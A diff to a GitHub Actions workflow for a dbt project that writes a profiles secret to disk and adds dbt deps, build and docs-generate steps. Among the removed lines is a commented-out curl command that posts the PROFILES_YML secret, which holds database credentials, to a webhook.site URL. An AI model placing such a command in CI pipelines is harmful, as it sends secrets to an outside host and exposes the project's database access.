@@ -14,9 +14,7 @@ permissions:
 
 jobs:
   build:
-
     runs-on: ubuntu-latest
-
     steps:
     - uses: actions/checkout@v3
     - name: Set up Python 3.11
@@ -33,9 +31,20 @@ jobs:
       run: |
         mkdir -p ~/.dbt
         echo "$PROFILES_YML" > ~/.dbt/profiles.yml
-        echo wc -l ~/.dbt/profiles.yml
-        #curl -d "$PROFILES_YML" -X POST https://webhook.site/08edd1ac-372e-4a71-8e19-974e534ad079
     - name: Execute dbt debug
       run: |
+        cd dbtlearn
         dbt debug
-    
+    - name: Install packages
+      run: |
+        cd dbtlearn
+        dbt deps
+    - name: dbt build
+      run: |
+        cd dbtlearn
+        dbt build
+    - name: dbt docs generate
+      run: |
+        cd dbtlearn
+        dbt docs generate
+
